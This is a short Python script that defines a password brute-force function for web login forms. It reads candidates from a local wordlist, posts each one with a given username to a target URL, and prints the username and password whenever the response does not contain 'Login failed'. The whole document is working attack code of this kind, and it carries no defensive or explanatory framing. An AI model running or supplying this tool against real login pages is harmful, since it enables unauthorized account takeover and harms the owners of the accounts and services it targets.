#!/usr/bin/python

import requests
from termcolor import colored

def bruteforce(username, url):
	flag = 0
	with open("passwordlist.txt", "r") as passwords:
		for password in passwords:
			password = password.strip()
			print(colored("[+] Trying to Bruteforce with Password: "+password, 'yellow'))
			data_dictionary = {"username":username, "password":password, "Login":"submit"}
			response = requests.post(url, data = data_dictionary)
			if "Login failed" in str(response.content):
				pass
			else:
				print(colored("[+] Username : "+username, 'green'))
				print(colored("[+] Password : "+password, 'green'))
				flag = 1
	if (flag == 0):
		print(colored("[-] Password not in the List.", 'red'))
	




